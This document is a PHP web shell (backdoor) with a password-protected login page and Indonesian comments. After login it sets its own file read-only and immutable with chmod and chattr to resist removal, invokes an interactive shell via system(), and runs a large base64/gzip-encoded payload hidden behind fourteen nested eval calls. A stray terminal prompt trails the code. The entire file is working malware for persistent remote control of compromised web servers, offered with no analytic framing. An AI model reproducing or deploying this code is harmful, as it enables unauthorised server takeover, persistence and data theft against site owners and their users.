<?php
session_start();
date_default_timezone_set("Asia/Jakarta");

// Konfigurasi
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';

// Fungsi untuk tampilan halaman login
function show_login_page($message = "")
{
?>
    <!DOCTYPE html>
    <html>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                font-family: monospace;
            }

            input[type="password"] {
                border: none;
                border-bottom: 1px solid green;
                padding: 2px;
            }

            input[type="password"]:focus {
                outline: none;
            }

            input[type="submit"] {
                border: none;
                padding: 4.5px 20px;
                background-color: #2e313d;
                color: #FFF;
            }
        </style>
    </head>

    <body>
        <form action="" method="post">
            <div align="center">
                <input type="password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value=">">
            </div>
        </form>
    </body>

    </html>

    </html>
<?php
    exit;
}

if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$NU2uxLR4j6JawvbSxvyKTeFNkF/mbTyfO1Xyl6lDfpfg2baKM38R2'; // Use PASSWORD_DEFAULT hash u can use this site https://phppasswordhash.com/ for generate ur password >  Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://phppasswordhash.com/ untuk menghasilkan kata sandi Anda

    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        $_SESSION['authenticated'] = true;
    } else {
        show_login_page();
    }
}
?>
<?php
$🥷🏿🔫 = __FILE__;
@system("chmod ugo-w $🥷🏿🔫");
@system("chattr +i $🥷🏿🔫");
@system("/bin/sh -i $🥷🏿🔫");
function _cZwH($_DQjCHl){$_DQjCHl=substr($_DQjCHl,(int)(hex2bin('393135')));$_DQjCHl=substr($_DQjCHl,(int)(hex2bin('30')),(int)(hex2bin('2d343936')));return $_DQjCHl;}$_D1obqEO='_cZwH';$_rgmvbZ='base64_decode';function _C49YoWFe2($_sU5460xy){global $_D1obqEO;global $_rgmvbZ;return strrev(gzinflate($_rgmvbZ(_cZwH($_sU5460xy))));}eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(_C49YoWFe2('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')))))))))))))));;
?>u0_a323@localhost:~$